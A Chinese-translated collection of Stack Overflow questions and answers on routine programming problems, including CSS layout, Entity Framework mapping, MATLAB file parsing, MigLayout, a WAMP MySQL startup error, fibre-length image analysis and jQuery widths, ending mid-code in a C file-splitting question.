因为这是一个面向开发的站点，所以讨论特定嵌入式硬件的优点并不重要。如果您决定重新专注于使用微控制器电子设备进行原型设计（[Arduino](http://www.arduino.cc/)、[FEZ](http://www.ghielectronics.com/)、[Propeller](http://www.parallax.com/propeller/)、[Basic Stamp](http://www.parallax.com/tabid/436/Default.aspx)、[Pololu](http://www.pololu.com/)等），您可能会在 stackexchange for electronics 上寻求电子硬件[建议](https://electronics.stackexchange.com/)。我会说，这些平台中的大多数旨在促进 LCD、LED、按钮和界面的原型设计，正如您所概述的那样。您通常可以在几分钟内组装一些预先构建的模块，并准备好开始对您的项目进行编码。在这里可以节省大量时间。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-25T08:22:16.110

你要求太多了，你需要看看@proteus。 [http://www.labcenter.com/products/vsm_overview.cfm](http://www.labcenter.com/products/vsm_overview.cfm)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-07T17:43:34.737

正如 Mahmoud 所说，您可能会在[proteus Professional](http://appliedelectronicsengineering.blogspot.com/2013/01/proteus-professional-v78-sp2-free.html)中找到带有原型示例的代码解决方案。它是流行的原型设计、仿真和编码软件之一，您可以[免费下载 proteus Professional](http://appliedelectronicsengineering.blogspot.com/2013/01/proteus-professional-v78-sp2-free.html)并查看其手册。

祝你好运

# html - 在表单内输入以覆盖所有背景

> ID：11702041
> 
> 赞同：0
> 
> 时间：2012-07-28T14:51:42.590
> 
> 标签：html, css, button, background, cover

现在我得到了以下[**页面**](http://jsfiddle.net/8zdyq/)

我希望橙色按钮覆盖所有白色背景，如下所示：

![在此处输入图像描述](../Images/8dd15bf56e00cebcb0723af192a5e05e.png)

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T15:13:44.083

您可以 `padding: .5em`从表单中删除，您想要做的是我假设输入字段文本居中，您可以通过更改字段来做到这一点`padding`，`input[type="website"]`这就是结果[**小提琴**](http://jsfiddle.net/8zdyq/5/)

供您参考，我`padding`这样使用：

`padding: .4em .3em .3em .7em;`

只不过是

```
padding-top: .4em;
padding-right: .3em;
padding-bottom: .3em;
padding-left: .7em; 
```

它被称为 CSS 速记属性，你可以在**[这里获得更多类似的东西](http://www.456bereastreet.com/archive/200502/efficient_css_with_shorthand_properties/)**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T14:54:38.137

您的表单上有 0.5em 填充（那个空白），使填充：0px；和你的套装

[http://jsfiddle.net/8zdyq/2/](http://jsfiddle.net/8zdyq/2/)

# entity-framework - 如何在 POCO 类中包含未映射的字段

> ID：11702046
> 
> 赞同：5
> 
> 时间：2012-07-28T14:52:46.457
> 
> 标签：entity-framework

我是 EF 的新手，我只是在尝试。有人可以告诉我以下是否可能。给定数据库中的（产品）表，如下所示：

```
Id Cost DescriptionFK
-- ---- -------------
?  ?    ? 
```

我希望相应的 POCO 类（实体）看起来像：

```
public class Product
{
    public int Id { get; set; }
    public decimal Cost { get; set; }
    public string Description { get; }
} 
```

请注意，类中的“描述”是只读字符串（没有设置器），但它是表中的键。我正在调用一个存储过程来解决这个问题（将密钥转换为相应的字符串并返回上面的类），但是如果我现在执行以下操作：

```
// ...
product.Cost = 20;
myContext.SaveChanges(); 
```

我收到一个异常，抱怨“描述”字符串没有映射。我删除了映射，因为它是只读的，并且我不需要在类本身中包含“DescriptionFK”。有什么方法可以解决这个问题（仅限 POCO）。非常感谢。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-07-29T00:49:59.770

如果您只是希望将 Description 属性作为计算字段，请将 [NotMapped] 添加到您的属性中以显式排除它，然后生成数据库：

```
public class Product
{
    public int Id { get; set; }
    public decimal Cost { get; set; }

    [NotMapped] 
    public string Description { get; }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-01-18T13:28:03.310

AFAIU，这是不可能的。

“您总是需要至少一个导航属性才能在数据库中创建外键约束。”

[没有导航属性的EF Code First外键](https://stackoverflow.com/questions/20886049/ef-code-first-foreign-key-without-navigation-property/30625266)

# matlab - 如何读取以点分隔的数字？

> ID：11702049
> 
> 赞同：0
> 
> 时间：2012-07-28T14:53:16.887
> 
> 标签：matlab, file-io

我正在尝试读取这样的日志文件：

```
14:27:30:000 1.01628432 152.35 310794
14:27:35:000 1.01628432 152.35 310794
14:27:36:000 1.01628432 152.35 310794
14:27:37:000 1.01628432 152.35 310794
14:27:38:000 1.01628432 152.35 310794
14:27:39:000 1.01628432 152.35 310794 
```

使用这样的代码：

```
data = textscan(fLog, '%f:%f:%f:%f %f.%f %f.%f %f'); 
```

并且不能完全阅读。同时，如果我`,`在数字中用作分隔符，而不是在`.`这样的代码中一切正常：

```
data = textscan(fLog, '%f:%f:%f:%f %f,%f %f,%f %f'); 
```

我想可能`.`是特殊字符操作系统的东西。由于我无法更改需要阅读才能使用的文件，因此我需要`,`调整我的 matlab 脚本以接受`.`。问题是如何做到这一点。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T15:09:41.997

`.`是浮点数 ( `%f`) 的一部分，如果您确定要单独读取每个数字，请将它们作为整数 ( `%d`) 读取：

```
'%f:%f:%f:%f %d.%d %d.%d %f' 
```

您确定不想将字段 2 和 3 读取为浮点数吗：

```
'%f:%f:%f:%f %f %f %f' 
```

# java - MigLayout：垂直跨越组件旁边的意外布局

> ID：11702050
> 
> 赞同：4
> 
> 时间：2012-07-28T14:53:20.880
> 
> 标签：java, swing, miglayout

在演示如何使用 MigLayout 轻松满足[布局要求](https://stackoverflow.com/questions/11699311/how-to-stick-to-top-of-container-in-boxlayout)时，我对以下结果感到惊讶：

```
MigLayout layout = new MigLayout("wrap 3, debug");
JComponent content = new JPanel(layout);

content.add(new JLabel("First:"));
content.add(new JScrollPane(new JTextArea(10, 20)), "skip, spany");
content.add(new JLabel("Second"));
content.add(new JTextField(10));
content.add(new JLabel("third"));
content.add(new JTextField(10));
//content.add(new JLabel()); 
```

布局思路很简单：

*   三列
*   跨越所有行的最后一列
*   前两列一堆标签/组件对

出乎意料的是，前两列的最后一行占用了所有可用的垂直空间，这导致将最后一对定位在其中间（顶部对齐不是一个选项，因为它们必须彼此基线对齐）

![在此处输入图像描述](../Images/d7ac6cf68f6b87670ce450b45365523e.png)

取消注释上面的最后一行（添加一个几乎不可见的虚拟对象）显示了预期的布局，但是不应该进入生产代码的 hack

![在此处输入图像描述](../Images/7d14ead89f165a8d983e21a9453359b6.png)

问题是：如何在没有黑客攻击的情况下实现预期的布局？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-28T16:59:13.473

[可能是一个错误](http://migcalendar.com/forums/viewtopic.php?f=8&t=3850)：

一种不那么老套的解决方法（如果在创建表单时知道行数，则适用）是显式定义行约束

```
MigLayout layout = new MigLayout("wrap 3, debug", "", "[][][][]"); 
```

即为跨越组件一侧的组件定义比实际需要的多行

# mysql - 打开 phpMyAdmin 时访问被拒绝

> ID：11702051
> 
> 赞同：12
> 
> 时间：2012-07-28T14:53:29.297
> 
> 标签：mysql, phpmyadmin, wamp

我在 WAMP 中的 MySQL 数据库服务器可能是什么问题。

我无法打开它。错误说：

```
MySQL said: Documentation
#2002 - No connection could be made because the target machine actively refused it.

The server is not responding (or the local server's socket is not correctly configured). 
```

我检查了端口，但没有其他应用程序使用专用于 mysqld 的端口 3306。

这`mysql.log`就是说：

```
120728 22:34:40 [Note] Plugin 'FEDERATED' is disabled.
120728 22:34:42 InnoDB: The InnoDB memory heap is disabled
120728 22:34:42 InnoDB: Mutexes and rw_locks use Windows interlocked functions
120728 22:34:42 InnoDB: Compressed tables use zlib 1.2.3
120728 22:34:43 InnoDB: Initializing buffer pool, size = 128.0M
120728 22:34:43 InnoDB: Completed initialization of buffer pool
120728 22:34:44 InnoDB: highest supported file format is Barracuda.
120728 22:34:52  InnoDB: Waiting for the background threads to start
120728 22:34:53 InnoDB: 1.1.8 started; log sequence number 74876578
wampmysqld: File '.\mysql-bin.000025' not found (Errcode: 2)
120728 22:34:53 [ERROR] Failed to open log (file '.\mysql-bin.000025', errno 2)
120728 22:34:53 [ERROR] Could not open log file
120728 22:34:53 [ERROR] Can't init tc log
120728 22:34:53 [ERROR] Aborting

120728 22:34:53  InnoDB: Starting shutdown...
120728 22:34:53  InnoDB: Shutdown completed; log sequence number 74876578
120728 22:34:53 [Note] wampmysqld: Shutdown complete

120728 22:35:16 [Note] Plugin 'FEDERATED' is disabled.
120728 22:35:16 InnoDB: The InnoDB memory heap is disabled
120728 22:35:16 InnoDB: Mutexes and rw_locks use Windows interlocked functions
120728 22:35:16 InnoDB: Compressed tables use zlib 1.2.3
120728 22:35:16 InnoDB: Initializing buffer pool, size = 128.0M
120728 22:35:16 InnoDB: Completed initialization of buffer pool
120728 22:35:16 InnoDB: highest supported file format is Barracuda.
120728 22:35:32  InnoDB: Waiting for the background threads to start
120728 22:35:33 InnoDB: 1.1.8 started; log sequence number 74876578
wampmysqld: File '.\mysql-bin.000025' not found (Errcode: 2)
120728 22:35:33 [ERROR] Failed to open log (file '.\mysql-bin.000025', errno 2)
120728 22:35:33 [ERROR] Could not open log file
120728 22:35:33 [ERROR] Can't init tc log
120728 22:35:33 [ERROR] Aborting

120728 22:35:33  InnoDB: Starting shutdown...
120728 22:35:34  InnoDB: Shutdown completed; log sequence number 74876578
120728 22:35:34 [Note] wampmysqld: Shutdown complete

120728 22:35:42 [Note] Plugin 'FEDERATED' is disabled.
120728 22:35:42 InnoDB: The InnoDB memory heap is disabled
120728 22:35:42 InnoDB: Mutexes and rw_locks use Windows interlocked functions
120728 22:35:42 InnoDB: Compressed tables use zlib 1.2.3
120728 22:35:42 InnoDB: Initializing buffer pool, size = 128.0M
120728 22:35:42 InnoDB: Completed initialization of buffer pool
120728 22:35:44 InnoDB: highest supported file format is Barracuda.
120728 22:35:59  InnoDB: Waiting for the background threads to start
120728 22:36:00 InnoDB: 1.1.8 started; log sequence number 74876578
wampmysqld: File '.\mysql-bin.000025' not found (Errcode: 2)
120728 22:36:00 [ERROR] Failed to open log (file '.\mysql-bin.000025', errno 2)
120728 22:36:00 [ERROR] Could not open log file
120728 22:36:00 [ERROR] Can't init tc log
120728 22:36:00 [ERROR] Aborting

120728 22:36:00  InnoDB: Starting shutdown...
120728 22:36:01  InnoDB: Shutdown completed; log sequence number 74876578
120728 22:36:01 [Note] wampmysqld: Shutdown complete 
```

PS：我没有Skype。所以我认为这不是冲突。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2015-08-20T05:31:28.900

这有效：

1.  停止 MySQL 服务
2.  打开数据文件夹
3.  删除 ib_logfile0 和 ib_logfile1
4.  重启服务

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-07-28T15:10:34.337

转到您的 MySQL 目录并找到`mysql-bin.index`然后清除其内容。之后一切都应该正常工作。

[资源](http://peter.nameservice.mobi/wiki/index.php?title=Can%27t_init_tc_log)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-07-28T17:41:58.013

我今天早上第一次在使用 mysql/easyphp 时遇到了这个问题。我尝试清除 mysql-bin.index 的内容，但这对我不起作用。

我重新启动计算机并尝试再次访问 mysql 并且没有更多问题。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-10-30T12:29:39.197

我停止了mysql

```
sudo service mysql stop 
```

然后使用以下命令启动lampp：

```
sudo /opt/lampp/lampp start 
```

一切正常

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2013-07-07T07:16:00.613

我有类似的错误。断开互联网连接，访问 phpmyadmin，然后重新连接互联网。这解决了我的问题。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2015-11-20T18:49:19.763

我发现在 windows temp 目录中创建了一些临时日志文件。如果超过日志文件限制并且 Windows 没有更多空间可用于写入该日志文件，则会触发拒绝访问错误。从临时目录中清除文件可以解决它。

在 Windows 7 中，按照流程进行操作。

运行>>键入`%temp%`并按Enter>>选择所有文件并删除>>重新启动WAMP并访问PHPMyAdmin。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-09-23T09:13:24.263

我也面临这个问题，但是禁用防火墙解决了这个问题。但是还有其他解决方法吗？我认为这不是运行 mysql 的好方法。但在那之前我们可以通过禁用防火墙来使用mysql。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2013-10-12T21:02:20.693

我有同样的问题，我尝试了上面所有的建议。
最后，对我来说，问题与主机文件有关，这是我之前为了解决另一个相关问题而添加的。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2012-11-16T11:49:21.980

也许 mysql 未配置为接受远程连接？

尝试以下操作：

打开你的 my.cnf（通常是 /etc/mysql/my.cnf）并更改显示的行

> 绑定 = 127.0.0.1

（如果存在）到您的网络 IP。

更改后重新启动 mysqld。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2013-07-23T18:23:58.840

我将我的 mysql 文件（整个目录结构）从一台 unix 计算机复制到另一台 unix 计算机。即使mysql服务器完全关闭，当我制作副本时，我无法让它在第二台计算机上启动。

我有一个错误“File ./mysql-bin.000532 not found Errorcode: 2” 因为我已经备份了整个内容，所以我可以删除片段而不会产生任何影响。换句话说，我不能让它再死了。我可以恢复我丢弃的任何文件。

通过在互联网上挖掘，我发现如果我删除 ib_logfile0 和 ib_logfile1，mysql 将尝试从头开始重新创建它们。这似乎推动了它。但是，它仍然要求并未能找到 mysql-bin.000532。在这个论坛中，我看到文件 mysql-bin.index 只是一个包含所有这些 mysql-bin.####### 文件的文本文件。清空它意味着我不会寻找丢失的文件。伟大的。现在它很好。

但是想想看。我确信这些文件是有原因的。它保持对数据的更改。如果您的更改实际上并没有放到磁盘上怎么办？你会失去他们。正如我在开始时所说，这是完全关闭的 mysql 副本。所以我所有的改变都在了。所以我很高兴去。

最后一件事，我确信这在某处的一些 mysql 文档中有所介绍。我只是还没有找到它。我的行动是基于猜测和实验。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2015-05-13T17:59:42.417

我经历过完全相同的情况。阅读大量博客和帖子。到目前为止，我的理解是它的发生主要是因为许可问题。Ubuntu/Linux 非常严格地处理目录访问及其权限。

找出`mysql`目录在哪里，然后给它适当的`access right n permission`. 刷新你`localhost/phpmyadmin`它现在应该可以工作了。

就我而言，我按照[此博客](http://fossdev.blogspot.fi/2013/01/mysql-cant-find-file-mysqlhostfrm-errno.html)进行了以下操作：

```
sudo chown -R mysql.mysql /opt/lampp/var/mysql 
```

*   请注意，在博客中它说mysql目录在`/var/lib/mysql`
*   但实际上我机器中的目录是`/opt/lampp/var/mysql`

所以目录可以不同。因此，指出正确的目录并给予它适当的访问权限。除非没有附加任何隐藏错误，否则它应该可以正常工作。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2017-10-20T08:57:34.343

我假设您可能因为最近更新了数据库而遇到了这个问题。

**如果是这种情况，请简单地执行以下三个步骤：**

1.  断开与您的互联网的连接。
2.  像往常一样离线访问您的 MySQL。
3.  登录 MySQL 后，您可以重新连接到 Internet。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2014-06-14T09:25:20.010

When I turned off my McAfee Firewall the problem was fixed

What I need to change in McAfee settings

Firewall -> Settings -> Program Permissions -> Apache HTTP Server -> need to be set to Full or Outgoing

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2014-12-10T18:47:03.320

我在使用 Wampserver 时遇到了同样的问题。它对我有用：

您必须更改此文件：“C:\wamp\bin\mysql[mysql_version]\my.ini”

例如：“C:\wamp\bin\mysql[mysql5.6.12]\my.ini”

并将默认端口 3306 更改为 80。（第 20 行和第 27 行，都在）

端口 = 3306 到端口 = 80

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2017-06-12T21:13:32.093

这些步骤对我有用：

1.  开放服务
2.  停止 MySQL[版本] 服务
3.  打开 MySQL 属性
4.  如果您手动安装了 MySQL（即不使用 xampp wamp 等），那么您可能需要将启动类型更改为自动
5.  转到登录选项卡
6.  **选择本地系统帐户**
7.  按确定
8.  再次启动服务

MySQL57 属性截图：
![MySQL57 属性截图](../Images/c407503708469fa83aeecdb6017f78f2.png)

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2016-09-27T21:54:59.423

有时您可能有多个网络服务器同时在同一位置运行，即 apache2 和 nginx，但端口不同。我建议停止 apache2 或 nginx，然后在删除任何文件之前重新启动您喜欢的那个。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2017-04-01T06:25:59.273

我安装了独立的 MySQL（不使用任何 XAMPP/WAMP 堆栈）并且前段时间遇到了这个问题。我刚刚在 windows 命令提示符下运行了以下命令：

```
C:\>"C:\mysql\bin\mysqld" --console 
```

其中“C:\mysql\”为安装目录（根据自己的情况调整路径）。这

```
 --console 
```

显示用于调试目的的过程。

启动后，您应该会看到如下内容：

```
C:\mysql\bin\mysqld: ready for connections
Version: '5.7.10'  socket: ''  port: 3306 
```

有关更多信息，请参阅[启动 MySQL 服务器](https://dev.mysql.com/doc/refman/5.7/en/windows-server-first-start.html)

* * *

## 回答 #18

> 赞同：-1
> 
> 时间：2014-11-14T08:36:43.697

What I did, is:

1.  Uninstall Wamp
2.  Delete the Wamp folder from C
3.  Reinstall Wamp again.

* * *

## 回答 #19

> 赞同：-1
> 
> 时间：2017-03-31T06:28:06.570

您可以通过重新启动系统来解决此问题。

在 Ubuntu 中，您可以使用：

```
reboot 
```

# c - 图像处理基础

> ID：11702053
> 
> 赞同：3
> 
> 时间：2012-07-28T14:53:43.673
> 
> 标签：c, image-processing, matlab, fiber

![在此处输入图像描述](../Images/67f34f0aba8a8f073fe0bede0749fe29.png)

我必须做一些图像处理，但我不知道从哪里开始。我的问题如下： -

我有一个 2D 纤维图像（附在这篇文章中），其中纤维边缘用白色表示，纤维内部是黑色的。我想选择光纤内的任何黑色像素，然后沿着光纤的长度从它移动。这将涉及将对比度与周围像素进行比较，然后沿所需方向行进。我的主要目的是找到纤维的长度

那么有人可以告诉我至少从哪里开始吗？我已经在脑海中制定了一个关于如何解决我的问题的粗略算法，但我什至不知道要使用哪个软件/库。

问候阿迪

EDIT1 - 我开始使用 MATLAB 而不是 OpenCV，因为我发现它更容易。我应用了 Hough 变换，然后应用了最大编号的 Houghpeaks 函数。峰数 = 100，以便包括所有纤维。之后，我得到了[以下图像](http://goo.gl/kxtVw)。我现在如何找到长度？

EDIT2 - 我找到了[一篇](http://www.cs.ou.edu/~atiq/papers/el-let92.pdf)关于如何使用霍夫变换计算长度的研究文章，但我无法在 MATLAB 中实现它。有人请帮忙

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-29T04:07:29.270

如果你的图片都和你发布的一样干净，这是一个很容易的问题。

我尝试的第一个技术是使用[霍夫变换](http://en.wikipedia.org/wiki/Hough_transform)来估计线参数，并且在 OpenCV 中有一个很好的算法[实现](http://docs.opencv.org/2.4.1/doc/tutorials/imgproc/imgtrans/hough_lines/hough_lines.html)。拥有它们之后，您可以根据您拥有的任何其他限制以任何您想要的方式估计它们的长度。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-29T00:58:26.140

既然您了解 C++ 和 C，我会推荐[OpenCV](http://opencv.org/) 。它是开源的，所以如果你不信任像我这样的人，你不会有问题;)。此外，如果您想使用像 @VictorS 这样的 C#。提到我会使用[EmguCV](http://emgu.com)，它是 OpenCV 的 C# 等价物。包括 OpenCV 的教程，EmguCV 的教程可以[在他们的网站上](http://www.emgu.com/wiki/index.php/Tutorial)找到。希望这可以帮助！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T21:40:10.437

假设： -该图像可以被认为是只有 0s（黑色）和 1s（白色）的二进制图像。-所有的纤维都是直的，它们的起点和终点都在边界上。-我们可以提出纤维厚度的限制（白线的厚度）。

在这些假设下：开始扫描图像边界（从任何你想要的任何方向开始......只要保持一致）直到你遇到第一个白色像素。此时你的程序会明白这绝对是一个起点. 通过了解这一点，您将收集所有白色像素，直到达到某个限制（或阈值）。这里的想法是，如果有纤维，您将获得纤维与起点所在边界之间的角度......当然，您获得的像素越多（获得的内部），您在结尾。这是最棘手的部分。在以某种方式结束后......你需要计算角度（基本三角）。由于您知道起点、图像的宽度/高度和角度（或这些角度的 cos/sin），您将获得终点的确切坐标。请注意...这里的准确性并不是您可能真正理解的，因为我们可能（事实是我们会）在 cos/sin 值中存在计算错误。因此，您需要尽可能长时间地保持阈值。因此，您的终点实际上不是一个点，而是一个表明终点可能位于该区域内的区域的区域。剩下的只是简单的数学。

显然，您可以在此方法中添加太多细节，例如检查构成光纤的两条白线并确定哪一条更长，或者您可以允许一些误差余量，因为这些线不会正确笔直......这是一个概念性的地方厚度来到舞台等。

编程：C# 有很好的东西并且易于使用...我将在这里放一些代码...

```
newBitmap = new Bitmap(openFileDialog1.FileName);

for (int x = 0; x < newBitmap.Width; x++)
{
   for (int y = 0; y < newBitmap.Height; y++)
   {
      Color originalColor = newBitmap.GetPixel(x, y);//gets the pixel value...
      //things go here...
   }
} 
```

您将从 openfiledialog 获取图像并对图像进行位图。在嵌套的 for 循环中，此代码从左到右扫描图像，但是您可以更改它...

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-28T15:43:37.367

在我看来，问题有两个方面：1）从您的起始位置定位起点和终点。2）确定起点和终点之间的长度

由于我不知道您的输入数据，我假设它是像素数据，每个像素上的 0..1 数据表示它的“白度”。

为了找到终点，我会做某种 WALKER/AI，它试图在不同的位置行走，知道原始位置和最后遍历的方向，然后沿着那条路线继续前进，直到“前进弧”全是白色。这假设纤维有点直（是吗？）。

获得起点和终点后，您可以将它们输入到 aa* 路径查找算法中，并为黑色像素赋予低值而白色非常高。然后找到起点和终点之间的最短距离，即光纤的长度。

有点难以提供更多细节，因为我不知道您将使用什么技术以及一些示例输入数据。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-10-26T10:54:58.620

下载并安装最新版本的 3Dslicer，加载您的数据并进入软件包>EM 分段器，无需 Atlas>

[![分割](../Images/f95423c8fdbe3590019398d8e02352db.png)](https://i.stack.imgur.com/jgjjG.png)

在 2 个不同的标签中选择您的解剖树，后面的标签是您的目的，白色边缘。选择整个 2D 图像作为您的 ROI，然后单击分段。

这是结果，我将边缘标记为绿色，将黑色区域标记为白色

[![边缘](../Images/6320d0f8b0de2e1e91380b75858f258c.png)](https://i.stack.imgur.com/tXJLB.png)

[![黑色区域](../Images/7b2ceda36210bcf4b905812c94e22b20.png)](https://i.stack.imgur.com/i2gCC.png)

您可以修改您的树并更改您定义的结构。您可以为分割提供更多样本以使其更准确。

# ios - iOS 中的 Quartz 2D 和 Mac OS X 中的一样吗？

> ID：11702054
> 
> 赞同：1
> 
> 时间：2012-07-28T14:53:53.633
> 
> 标签：ios, macos, core-graphics, quartz-2d

iOS 和 OS X 之间的 Quartz 编程是否一致？我正在寻找一本关于 Quartz 的好书，遇到了[一本](https://rads.stackoverflow.com/amzn/click/com/0123694736)适用于 Mac OS X 的书，但我只为 iOS 构建。由于某些 API 不同，例如 OpenGL，我想知道这是否同样适用于 Quartz？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T15:08:29.577

不，Quartz 似乎非常相似，如果不完全相同的话。坐标系相同，原点在左下方。

我不知道有什么区别。[甚至错误都是相同的。](http://www.openradar.me/11273462)

# jquery - jquery写css宽度

> ID：11702058
> 
> 赞同：1
> 
> 时间：2012-07-28T14:53:59.820
> 
> 标签：jquery, css, width

我想使用jquery手动编写具有某个div类的一系列元素的css宽度。

我正在尝试询问文档宽度，将其记录为变量，然后将该变量传递给新的 css 'width' 规则......但我的 jquery 技能有点太少了

[http://jsfiddle.net/ZEcCw/](http://jsfiddle.net/ZEcCw/)

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T14:56:08.700

您当前将宽度设置为字符串文字 "fiftypercent" - 您的意思是*变量* `fiftypercent`. 此外，您的选择器必须是一个字符串。

```
$('.block').css("width", fiftypercent);​ 
```

你所拥有的会导致错误；使用 JavaScript，如果某些东西似乎不起作用，查看错误控制台总是值得的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T14:56:38.063

你搞砸了你的报价：

```
var documentWidth = $(document).width();
var fiftypercent = documentWidth /2;
$(".block").css("width", fiftypercent); 
```

请注意，我在选择器 (.block) 周围添加了引号，并删除了 50% 左右的引号以引用变量。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-28T14:57:28.667

尝试这个：

```
var documentWidth = $(document).width();
var fiftypercent = documentWidth /2;
$(".block").each( function() { $(this).css("width",fiftypercent + "px") }); 
```

这将为所有具有“.block”类的元素提供所需的宽度。也许你应该考虑这个：

```
$(".block").each( function() { $(this).css("width","50%") }); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-28T15:08:10.527

您在错误的地方使用了引号。如果您想在用户调整窗口大小时更改 div 的大小，可以尝试以下操作：

```
$(window).resize(function(){
  var doc = $(document).width();
  $(".block").css("width", (doc / 2) );  
}).resize() 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-28T14:57:50.493

尝试这样做

```
var documentWidth = $(document).width();
var fiftypercent = documentWidth /2;
$('.block').css("width",fiftypercent)​​​​​​​​​​ 
```

# android - 如何在 Android 中逐个标签读取 XML 文件标签？

> ID：11702064
> 
> 赞同：-1
> 
> 时间：2012-07-28T14:56:05.030
> 
> 标签：android, xml, file, parsing, readfile

```
<results count="6">
<result>
    <id>1</id>
    <name>Mark</name>
    <amount>6958</amount>
</result>
<result>
    <id>2</id>
    <name>Akash</name>
    <amount>4039</amount>
</result>
<result>
    <id>3</id>
    <name>Mihir</name>
    <amount>3809</amount>
</result>
<result>
    <id>4</id>
    <name>Deepak</name>
    <amount>1980</amount>
</result>
<result>
    <id>5</id>
    <name>Tina</name>
    <amount>24</amount>
</result>
<result>
    <id>6</id>
    <name>Ike</name>
    <amount>3</amount>
</result> 
```

这是我现在要生成的 XML 文件，我想逐个标签读取此文件标签并将其显示在 Android 屏幕上，请帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T15:05:44.820

您可以从这个使用 DOM 解析器的[Android XML 解析教程开始。](http://www.androidhive.info/2011/11/android-xml-parsing-tutorial/)它还演示了如何使用已解析的 XML 数据更新 ListView。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T15:11:28.810

检查[这个](http://www.androidhive.info/2011/11/android-xml-parsing-tutorial/)，[这个](http://developer.android.com/training/basics/network-ops/xml.html)，[这个](http://www.jondev.net/articles/Android_XML_SAX_Parser_Example)和[这个](http://www.vogella.com/articles/JavaXML/article.html)。

# jquery - jquery 手风琴饼干/持久性

> ID：11702067
> 
> 赞同：0
> 
> 时间：2012-07-28T14:56:11.620
> 
> 标签：jquery, cookies, persistence, accordion

我想用 jquery.cookie 保存手风琴菜单的状态（打开/关闭）。有人可以帮我设置cookie吗？

```
$('#menu').children('[data-header]').hide().each(function() {
    $(this).before('<h3 class="menu-header">' + $(this).data('header') + '</h3>');
}).prev().on("click", function() {
    $(this).toggleClass('on').next().slideToggle();
  }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T17:53:23.660

问题在这里解决了：http: [//jsfiddle.net/tovic/EDQn9/12/](http://jsfiddle.net/tovic/EDQn9/12/)
感谢来自 css-tricks.com 的 Hompimpa

# python - 如何使用基于 XML 的 GUI 布局生成 python GUI？

> ID：11702071
> 
> 赞同：1
> 
> 时间：2012-07-28T14:57:03.113
> 
> 标签：python, xml, user-interface, themes, skin

我在 Photoshop 中设计了一个定制的 UI，现在我想使用 XML 来创建 Python 的 GUI。我看到了这个网站[http://wiki.xbmc.org/index.php?title=WindowXML](http://wiki.xbmc.org/index.php?title=WindowXML)，他们使用 WindowXML GUI Toolkit 来创建定制的 GUI。

有人实现了这一点吗？我在哪里可以获得更多信息？

我听说过 Qt 和 wxPython，但我发现的所有示例都可以使用 Tkinter 轻松实现。

请用一些例子和（或）细节回答这个问题。我知道许多 python（新手）程序员正在寻找这样的东西。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T15:12:10.233

我认为[glade](http://glade.gnome.org/)将 GUI 构造输出为 XML 文件，然后可以将其翻译成 Python（或其他语言）。您可以直接使用 Glade 构造函数来设计 GUI，但由于您已经使用 Photoshop 完成了它，您可以尝试在 glade 输出的相同模式中编写布局。一旦你这样做了，glade 工具链应该能够为你将它转换成 Python。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-28T15:01:44.547

不是 XML，但 QT 支持[QML](http://en.wikipedia.org/wiki/QML)，这是一种简洁的基于 Javascript 的方式来执行一些 GUI 的声明性布局：

```
 Item {
     Rectangle {
         id: myRect
         width: 100
         height: 100
     }
     Rectangle {
         width: myRect.width
         height: 200
     }
 } 
```

这是一个使用 PySide（Python 的 QT 库）的 QML[教程。](http://www.pyside.org/docs/pyside/tutorials/qmladvancedtutorial/)

# c - 在c错误中拆分文件在readfile中获取缓冲区

> ID：11702072
> 
> 赞同：0
> 
> 时间：2012-07-28T14:57:19.563
> 
> 标签：c, file, file-io, split

我编写了一个程序来在 Ubuntu 中用 C 语言分割文件。在读取文件中获取缓冲区时出现错误。这是我的代码。

```
 int split(char *filename, unsigned long part) {
        FILE *fp;
        char *buffer;
        size_t result; // bytes read
        off_t fileSize;

        fp = fopen(filename, "rb");
        if (fp == NULL) {
            fprintf(stderr, "Cannot Open %s", filename);
            exit(2);
        }
    // Get Size
        fileSize = get_file_size(filename);
    // Buffer
        buffer = (char*) malloc(sizeof(char) * (fileSize + 1));
        if (buffer == NULL) {
            fputs("Memory error", stderr);
            fclose(fp);
            return 1;
        }
    // Copy file into buffer
    //char buffers[11];
        result = fread(buffer, 1, fileSize, fp);
        buffer[fileSize] = '\0';

        if (result != fileSize) {
            fputs("Reading error", stderr);
            return 1;
